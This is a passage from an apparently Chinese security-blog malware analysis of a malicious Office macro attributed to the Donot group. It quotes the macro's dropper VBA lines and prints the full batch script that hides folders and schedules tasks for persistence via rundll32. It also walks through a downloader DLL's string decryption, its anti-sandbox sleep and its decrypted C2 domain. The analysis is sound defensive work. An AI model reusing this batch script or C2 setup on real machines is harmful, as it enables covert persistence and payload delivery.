monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="apache"><code><span class="code-snippet_outer"><span class="code-snippet__attribute">Sheet12</span>.OLEObjects(<span class="code-snippet__string">"Object 1"</span>).Copy</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attribute">Sheet8</span>.OLEObjects(<span class="code-snippet__string">"Object 1"</span>).Copy</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attribute">digit</span>.CopyFile request &amp; <span class="code-snippet__string">"Vol"</span>, Digital &amp; <span class="code-snippet__string">"s.bat"</span> 'FileFormat:=xlOpenXMLWorkbook</span></code><code><span class="code-snippet_outer"><span class="code-snippet__attribute">digit</span>.CopyFile request &amp; <span class="code-snippet__string">"s"</span>, Digital &amp; <span class="code-snippet__string">"s"</span> 'FileFormat:=xlOpenXMLWorkbook</span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">分别将sheet中的数据拷贝到Digital，也就是%appdata%中并且命名为s和s.bat</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.3753106876553438" data-type="png" data-w="1207" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/28_PYB5tcYPOW6B7oFicx6UrKKMhDAh4g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibFz6XqA5zlTkPaKN75icLT12a1DPYB5tcYPOW6B7oFicx6UrKKMhDAh4g/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">然后通过<br style="box-sizing: border-box;"  />https = Digital &amp; “” &amp; “s.bat”<br style="box-sizing: border-box;"  />Call Shell(https, vbHide)<br style="box-sizing: border-box;"  />拼接s.bat的路径并且再次通过Shell指令运行。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">至此宏代码运行完成。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们可以看到，在该样本中，宏代码很短，宏代码的功能位<br style="box-sizing: border-box;"  />1.弹框迷惑用户<br style="box-sizing: border-box;"  />2.释放一个S文件，经查看为一个PE文件<br style="box-sizing: border-box;"  />3.释放一个s.bat批处理文件<br style="box-sizing: border-box;"  />4.调用执行s.bat文件</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">到这里我们也可以猜测出，s.bat文件将用于调用执行s文件。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们查看一下s.bat的内容：</span></section><p><br  /></p><pre style="box-sizing: border-box;font family: SFMono-Regular, Menlo, Monaco, Consolas, &#39;Liberation Mono&#39;, &#39;Courier New&#39;, monospace;font-size:14px;line-height:34px;;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);"><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="perl"><code><span class="code-snippet_outer">echo off</span></code><code><span class="code-snippet_outer">md %USERPROFILE%InetLogsCust</span></code><code><span class="code-snippet_outer">md %USERPROFILE%InetLogsPool</span></code><code><span class="code-snippet_outer">md %USERPROFILE%CommonBuildOffice</span></code><code><span class="code-snippet_outer">md %USERPROFILE%FilesSharedWeb</span></code><code><span class="code-snippet_outer">md %USERPROFILE%ViewerInformationPolicy</span></code><code><span class="code-snippet_outer">attrib +a +h +<span class="code-snippet__keyword">s</span> %USERPROFILE%Inet</span></code><code><span class="code-snippet_outer">attrib +a +h +<span class="code-snippet__keyword">s</span> %USERPROFILE%Common</span></code><code><span class="code-snippet_outer">attrib +a +h +<span class="code-snippet__keyword">s</span> %USERPROFILE%Files</span></code><code><span class="code-snippet_outer">attrib +a +h +<span class="code-snippet__keyword">s</span> %USERPROFILE%Viewer</span></code><code><span class="code-snippet_outer">del /f %USERPROFILE%InetLogsPoolagnia</span></code><code><span class="code-snippet_outer">SET /A %COMPUTERNAME%</span></code><code><span class="code-snippet_outer">SET /A RAND=%RANDOM% <span class="code-snippet__number">10000</span> + <span class="code-snippet__number">2</span></span></code><code><span class="code-snippet_outer">echo %COMPUTERNAME%-%RAND% &gt;&gt; %USERPROFILE%InetLogsPoolagnia</span></code><code><span class="code-snippet_outer">schtasks /<span class="code-snippet__keyword">delete</span> /tn Feed /f</span></code><code><span class="code-snippet_outer">schtasks /<span class="code-snippet__keyword">delete</span> /tn Sys_Core /f</span></code><code><span class="code-snippet_outer">schtasks /create /sc minute /mo <span class="code-snippet__number">10</span> /f /tn Sys_Core /<span class="code-snippet__keyword">tr</span> %USERPROFILE%FilesSharedWebgapdat.exe</span></code><code><span class="code-snippet_outer">schtasks /create /sc minute /mo <span class="code-snippet__number">30</span> /f /tn Feed /<span class="code-snippet__keyword">tr</span> <span class="code-snippet__string">"rundll32.exe '%USERPROFILE%ViewerInformationPolicysqmap.dll', calldll"</span></span></code><code><span class="code-snippet_outer">move %AppData%s %USERPROFILE%ViewerInformationPolicy</span></code><code><span class="code-snippet_outer">ren %USERPROFILE%ViewerInformationPolicys sqmap.dll</span></code><code><span class="code-snippet_outer">del %0</span></code></pre></section></pre><p><br  /></p><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">bat文件的语法还是比较简单明了的，通过bat的内容，我们可以得知程序获取了计算机的COMPUTERNAME和一个随机值写入到了%USERPROFILE%InetLogsPoolagnia，然后程序设置了两个计划任务，并且将%appdata%下的s文件移动到了%USERPROFILE%ViewerInformationPolicys并重命名为sqmap.dll</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">计划任务1：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.4639027877055039" data-type="png" data-w="1399" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/29_gFZDEtTxF38MibqBLzsQumdOKUNf2A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibBict4pPh1oBkiciaRzrpS7bnfPX2gFZDEtTxF38MibqBLzsQumdOKUNf2A/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">计划任务2：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.44861800141743446" data-type="png" data-w="1411" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/30_R3HrPrVhON9TJQYhSowz8TKzdY1U9g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPib20uwNrfQSWujdKydeonibzdHeR3HrPrVhON9TJQYhSowz8TKzdY1U9g/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们查看计划任务1所指定的目录文件可以发现暂时是0kb</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.42713903743315507" data-type="png" data-w="1496" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/31_WIgDhRcG7OZpAqYRyaibDMSPjQkFdA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibZnoTH113Kiat84KCPLKXQLBibDPWIgDhRcG7OZpAqYRyaibDMSPjQkFdA/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">查看计划任务2所指定的任务，可以看到文件已经成功移动过来：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.38854296388542964" data-type="png" data-w="1606" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/32_caZgvj0zmfBPn8CPz01bSQ9UK2RdSQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibV7SzAOpaaEKQTKSeqTeTpZKWicaZgvj0zmfBPn8CPz01bSQ9UK2RdSQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">通过hash查询可以确定s和sqmap.dll是同一个文件：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.38018741633199465" data-type="png" data-w="747" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/33_VMnE0fNbJibz9zmYQO5WCxPKMqrORQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibTMbF2icpzvUzy5rnUhaKLIeYolVMnE0fNbJibz9zmYQO5WCxPKMqrORQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">且我们通过计划任务2可以得知，这里是通过rundll32.exe 调用了这个名为sqlmap.dll的calldll方法。<br style="box-sizing: border-box;"  />目前vt(2020-06-24)上关于sqlmap.dll检出量为0：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.40034364261168387" data-type="png" data-w="1746" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/34_iaf3ux8kVGBNUy8DnMqiaMdicvrNbg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibK5g0AeWfM4ibcVrfrfdITA6qch73iaf3ux8kVGBNUy8DnMqiaMdicvrNbg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">我们可以对sqlmap.dll进行一个简单的分析。<br style="box-sizing: border-box;"  />首先通过IDA加载sqlmap.dll，我们可以得到PDB信息：C:UsersspartanDocumentsVisual Studio 2010new projectsfrontendReleasetest.pdb</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">该pdb以前未出现过，而且结合test.pdb的字眼，该样本可能是攻击者开发的测试版本。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.27893738140417457" data-type="png" data-w="1054" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/35_Mb8D8nLsrLjwbJ4JWWHfp2XSvt6rGA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibHNico1BmPibeJvoXXcOxp6nssoMb8D8nLsrLjwbJ4JWWHfp2XSvt6rGA/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">calldll在导出表中</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.1352253756260434" data-type="png" data-w="599" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/36_iciaOouuMHsVemwsAxuq0Pgr6LcRRA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibvGiagZD6cL3RFFn4PzDdZuhZUAViciaOouuMHsVemwsAxuq0Pgr6LcRRA/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">calldll函数体很简单，就执行来一个call sub_10001280 我们跟进到该函数。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">sub_10001280 首先是通过strcpy复制了一个看起来像是加密字符串的东西到变量<br style="box-sizing: border-box;"  />bbLorkybbYngxkjbb]khbbmgvjgz4k~k</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.5404101326899879" data-type="png" data-w="829" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/37_F2uKs9rtiaeibHryqRUy0HRbUZXLXQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibvACfxDiaaoosQ8ec2HhtRA74dx6F2uKs9rtiaeibHryqRUy0HRbUZXLXQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">该字符串暂时在Google上没有检出：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.39036381514257623" data-type="png" data-w="1017" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/38_wk4icwrOrtZlPLJzt414v00hjt2SIg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibEW1M0WcKibMxdObQWyYlRA8XEZwk4icwrOrtZlPLJzt414v00hjt2SIg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">回到代码中，接下来程序会对上面的字符串进行解密：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.34106412005457026" data-type="png" data-w="733" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/39_3ufBIyqIxQWOibtWbwaUgp2qrCvZEg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPib17TcGNrt6hF1qaAFQR1l33ZF73ufBIyqIxQWOibtWbwaUgp2qrCvZEg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">调试器中直接在calldll函数这里设置eip然后运行：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.668724279835391" data-type="png" data-w="972" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/40_YD5mqaVV4wXf0T51NL3EhGicR33IWg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPib35ic7UsOIEw6dYIjxFNURKCLC3YD5mqaVV4wXf0T51NL3EhGicR33IWg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">F7跟进进来</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.7239858906525574" data-type="png" data-w="1134" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/41_s2P1PSDkU1LOpMx6WZdltgOZfLFvHw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibbHLWXPFHLomibYQa6bx1pkRLls2P1PSDkU1LOpMx6WZdltgOZfLFvHw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">成功解密之后发现就是先前看到的路径</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.11942959001782531" data-type="png" data-w="561" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/42_3sicmAiagADTBRY6WdDfEia6zxEjqg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibaZkkicBGr3b2Xe2r6aCYslFSD8Rb3sicmAiagADTBRY6WdDfEia6zxEjqg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">回到IDA中进行标注后继续往下看，成功解密之后，尝试打开文件对象，打开失败，则push16A26h然后执行slepp，sleep之后调用sub_10001000，这里的sleep应该是用于反沙箱的</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.8405627198124267" data-type="png" data-w="853" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/43_uIwHlONuxKqBJY5UB3kWLklhNCePRw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibqGgNk258EG0G8IzmEs8tCOQouIwHlONuxKqBJY5UB3kWLklhNCePRw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">sub_10001000的内容非常明显，是解密URL并请求，所以很明显，sqlmap.dll是一个Download，比较直观的C伪代码显示：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.7491821155943293" data-type="png" data-w="917" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/44_h8UfRiao4byfAdfHibdk2Ss7Yaayzw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibiaKPMSrmzdiby70kaZXvia0TdGKz1h8UfRiao4byfAdfHibdk2Ss7Yaayzw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">根据之前看到的信息，可以猜测这里是解密了域名之后，下载文件保存到之前看到大小为0kb的路径下，然后通过计划任务持久化执行。<br style="box-sizing: border-box;"  />解密得到<br style="box-sizing: border-box;"  />dnsresolve.live</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.10825688073394496" data-type="png" data-w="545" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/45_RribaFuibtx3PxzMBRZaWW7ZricqwQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibDv7gKan8786thgrSPAMVP1AmiaibRRribaFuibtx3PxzMBRZaWW7ZricqwQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">该地址已经跟donot关联了起来</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.2714477211796247" data-type="png" data-w="1492" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/46_VPcd4jIUyy43OovsDL6Tub8dAk2o4g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibckp329BAYnLyshiaBibo4Nyan3VPcd4jIUyy43OovsDL6Tub8dAk2o4g/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">解析参数是</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.09540229885057472" data-type="png" data-w="870" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/47_4IfJZE86rpOsphKUH8IxXkyc8aV5Wg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibynGhJlYcnBZfyYKwUAib2OXFu4IfJZE86rpOsphKUH8IxXkyc8aV5Wg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">但是目前这个地址404了，不知道是不是我请求姿势的问题</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.23839662447257384" data-type="png" data-w="474" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/48_QaZWJqZXNLUKzdGxdu1RmL74pEmuSQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibgfgBd06AhxOAweCW5NsQ5fMaQaZWJqZXNLUKzdGxdu1RmL74pEmuSQ/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">于是查询了一下h6s87ehsci75sgats关键字：</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.5629453681710214" data-type="png" data-w="842" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/49_HzGyXHIYJg1PwiaLMWLaOgNTIwsyWg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibccJXwdjPwBsWIZSbaLOhfegcYHzGyXHIYJg1PwiaLMWLaOgNTIwsyWg/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">发现沙箱和vt也是404 ，这里后续就断了</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.15808491418247517" data-type="png" data-w="1107" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/50_wbvf1tjia866cvRCiaTtkRfxkFbaJA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibdQ88rlpHC24ZBUwXUT59ibCkEvmwbvf1tjia866cvRCiaTtkRfxkFbaJA/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">加上header也是404</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="top: auto;left: auto;margin: 12px 289px;right: auto;bottom: auto;font-size:15px;line-height:35px;;"><img data-ratio="0.3654618473895582" data-type="png" data-w="747" src="图片/HACK学习呀_2021-01-05_干货恶意代码分析之Office宏代码分析/51_PcOvNek189GMpcfTpSnh1LXPreVGyw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb7QxxODhJSnPyIZe6ZNAgPibpATEYYOxpWPaZlLp2qnVLpSOPcOvNek189GMpcfTpSnh1LXPreVGyw/640?wx_fmt=png'" style="box-sizing: border-box;vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">那么此次攻击分析到这就没有后续了，不知道是不是因为样本曝光，攻击者撤销了后续下载样本的原因。还是攻击者已经通过bat文件实现了本地持久化，所以故意暂时没有开放目标地址，防止分析人员，等热度过去了之后，再放开这个地址。如果是后面这种情况，可以考虑写脚本监视这个地址，看看过段时间是否有返回。</span></section><section style="box-sizing: border-box;margin: 5px 16px 1rem;text-align: justify;line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;">&nbsp;</span></section><section data-tools="新媒体排版" data-id="13744" data-style-type="标题"><section data-tools="新媒体管家" style="width: fit-content;margin: 0px auto;padding-top: 3px;visibility: visible;max-width: 100%;"><section style="display: flex;justify-content: center;margin: 0px 16px;visibility: visible;max-width: 100%;"><section data-darkmode-bgimage="1" 